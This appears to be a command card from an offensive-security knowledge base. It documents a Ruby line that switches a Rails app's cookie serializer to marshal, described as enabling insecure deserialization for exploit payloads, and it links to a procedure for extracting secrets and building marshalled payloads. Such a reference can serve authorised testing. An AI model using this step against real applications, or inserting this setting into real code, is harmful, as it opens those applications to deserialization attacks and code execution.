---
data: 'request.env["action_dispatch.cookies_serializer"]=:marshal'
tags:
  - rails
  - deserialization
type: command
executor: ruby
platforms:
  - Linux
id: 3875729f-b652-4469-ac30-d56e06725f15
created_at: '2025-12-11T03:47:59.298Z'
updated_at: '2025-12-11T03:47:59.298Z'
verified: false
validated: true
submitted: true
---
# rails-set-serializer

## Command

```ruby
request.env["action_dispatch.cookies_serializer"]=:marshal
```

## Description

Sets the cookie serializer to marshal mode, enabling insecure deserialization for exploit payloads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `:marshal` | Serializer type | Yes |

## Examples

### Basic Usage

```ruby
request.env["action_dispatch.cookies_serializer"]=:marshal
```

## Expected Output

Serializer set to marshal.

## Related

- [[commands/rails-request-setup]]
- [[procedures/Extract-Secrets-and-Generate-Marshalled-Payload]]
